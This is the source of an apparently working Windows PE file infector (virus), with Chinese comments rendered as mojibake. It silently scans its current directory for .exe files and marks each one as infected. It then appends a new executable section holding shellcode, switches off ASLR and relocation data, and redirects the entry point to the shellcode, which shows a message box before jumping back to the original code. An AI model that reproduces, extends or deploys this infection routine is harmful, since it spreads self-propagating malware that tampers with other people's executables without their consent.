#include "InfectPE.h"
#pragma comment( linker, "/subsystem:windows  /entry:mainCRTStartup" ) // ����ʾUI

// shellcode
void __declspec(naked) ShellcodeStart()
{
	__asm {
				pushad
				call    routine

	routine :
				pop     ebp
				sub      ebp, offset routine
				push    0                                // MB_OK
				lea       eax, [ebp + szCaption]
				push    eax                              // lpCaption
				lea	   eax, [ebp + szText]
				push    eax                              // lpText
				push    0                                // hWnd
				mov     eax, 0xAAAAAAAA
				call      eax                              // MessageBoxA

				popad
				push    0xBBBBBBBB                       // OEP
				ret

	szCaption :
					db('V') db('i') db('r') db('u') db('s') db(0)
	szText :
					db('I') db('n') db('f') db('l') db('e') db('c') db('t') db(' ') db('s')
					db('u') db('c') db('c') db('e') db('s') db('s') db(' ') db('!') db(0)
	}
}

void  ShellcodeEnd(void) {}

/*
����Ƿ�Ϊ����PE�ļ�
*/
BOOL IsPeFile(PVOID pHdr)
{
	//�ж�DOSͷ��־�Ƿ���ȷ
	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
	if (p1->e_magic != IMAGE_DOS_SIGNATURE){
		return FALSE;
	}
	//�ж�PEͷ��־�Ƿ���ȷ
	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
	if (p2->Signature != IMAGE_NT_SIGNATURE){
		return FALSE;
	}
	return TRUE;
}

/*
�ж��ļ��Ƿ񱻸�Ⱦ
*/
BOOL IsInfected(PVOID pHdr)
{
	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
	//�ж�DOSͷ�ı���λ�Ƿ��ѱ����Ϊ 0xABCD
	if ( p->e_res2[0] == (WORD)INFECTFLAG){
		return TRUE;
	}
	else{
		p->e_res2[0] = (WORD)INFECTFLAG;
		return FALSE;
	}
}

/*
�ֽڶ���
*/
int Align(int size,int n)
{
	if (size%n)	{
		return (size/n + 1)*n;
	}
	return size;
}

/*
��Ⱦָ���ļ�
*/
BOOL InfectFile(TCHAR *fpath)
{
	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if ( hFile  == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);
	if (!hMapFile){
		CloseHandle(hFile);
		return FALSE;
	}
	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);
	if (!pHdr){
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// �ж��Ƿ�Ϊ����PE�ļ�
	if (!IsPeFile(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//�ж��Ƿ��ѱ���Ⱦ
	if (IsInfected(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//PEͷָ�룺 �ļ�ͷָ��+DOSͷ��e_lfanewλָ����PEͷƫ��
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
	//����ͷָ�룺 PEͷָ��+PEͷ�ĳ���
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));
	//�������뵥λ
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;

	//���һ����ָ��
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
	//���� һ���½�
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];
	//ԭ��ڵ�ַ��OEP��
	DWORD dwOldOEP = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	//�����Ĵ��볤��
	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

	//����½ڵĸ��ֶ�
	memcpy(pNewSec->Name,".new",5);
	pNewSec->Misc.VirtualSize = dwCodeSize;
	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize, dwSecAlign);
	pNewSec->SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);
	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
	
	//������Ŀ�� 1
	pNTHdr->FileHeader.NumberOfSections++;
	//����PE�����С
	pNTHdr->OptionalHeader.SizeOfImage += Align(pNewSec->Misc.VirtualSize,dwSecAlign);

	//��̬��ȡ MessageBoxA ������ַ
	HMODULE hModule = LoadLibraryA("user32.dll");
	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	//�޸� shellcode �� MessabeBoxA��OEP ��ַ
	HANDLE hHeap = HeapCreate(NULL,NULL,dwCodeSize);
	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);
	memcpy(lpHeap,ShellcodeStart,dwCodeSize);

	DWORD dwIncrementor = 0;
	for(;dwIncrementor < dwCodeSize; dwIncrementor++){
		//�޸� MessageBoxA ��ַ
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA){
			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;
		}
		//�޸� OEP ��ַ
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xBBBBBBBB){
			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;
			FreeLibrary(hModule);
			break;
		}
	}

	//�ر�Ŀ������ ASLR
	pNTHdr->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
	pNTHdr->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	pNTHdr->OptionalHeader.DataDirectory[5].VirtualAddress = 0;
	pNTHdr->OptionalHeader.DataDirectory[5].Size = 0;

	//����shellcode���½���
	DWORD dwSize = 0;
	SetFilePointer(hFile,NULL,NULL,FILE_END);
	WriteFile(hFile,lpHeap,pNewSec->SizeOfRawData,&dwSize,NULL);
	HeapFree(hHeap,NULL,lpHeap);
	HeapDestroy(hHeap);

	//��������������ʼ��ַΪ�µ���ڵ�ַ
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress;

	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);
	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	return TRUE;
}

int main(void)
{
	WIN32_FIND_DATA FileInfo;
	HANDLE hListFile;
	TCHAR szFilePath[MAX_PATH];
	TCHAR szCurrentPath[MAX_PATH];
	TCHAR szCurrentModule[MAX_PATH];

	//��ȡ��ǰĿ¼
	GetCurrentDirectory(MAX_PATH,szCurrentPath);
	//��ȡ��ǰģ��·��
	GetModuleFileName(NULL,szCurrentModule,MAX_PATH);
	lstrcpy(szFilePath,szCurrentPath);
	lstrcat(szFilePath,L"\\*.exe");

	//������ǰĿ¼����Ⱦ�������������.exe�ļ�
	hListFile = FindFirstFile(szFilePath,&FileInfo);
	if(hListFile == INVALID_HANDLE_VALUE){
		return 0;
	}
	else{
		do{
			if(!_tcsstr(szCurrentModule,FileInfo.cFileName)){
				//��ȾĿ���ļ�
				if (!InfectFile(FileInfo.cFileName)){
					return 0;
				}
			}
		}while(FindNextFile(hListFile,&FileInfo));
	}
}

